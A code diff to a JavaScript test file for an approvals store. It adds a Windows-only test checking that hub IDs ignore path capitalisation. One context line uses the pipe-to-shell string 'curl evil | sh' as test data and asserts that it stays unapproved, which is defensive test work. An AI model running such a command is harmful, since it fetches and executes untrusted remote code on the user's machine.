@@ -81,6 +81,15 @@ describe('approvals store', () => {
     expect(loadApprovals(hub)).toEqual([]);
     expect(isApproved(loadApprovals(hub), ref('curl evil | sh'))).toBe(false);
   });
+
+  // on Windows the same hub spelled with other capitals must find the same state (ignore list included)
+  it.runIf(process.platform === 'win32')('hubId does not depend on how the hub path is capitalised', () => {
+    const upper = hub.toUpperCase();
+    const lowerDrive = hub[0].toLowerCase() + hub.slice(1);
+    expect(hubId(upper)).toBe(hubId(hub));
+    expect(hubId(lowerDrive)).toBe(hubId(hub));
+    expect(hubId(path.join(upper, 'NOT-YET'))).toBe(hubId(path.join(hub, 'not-yet')));
+  });
 });
 
 // custom checks and installs are POSIX shell commands
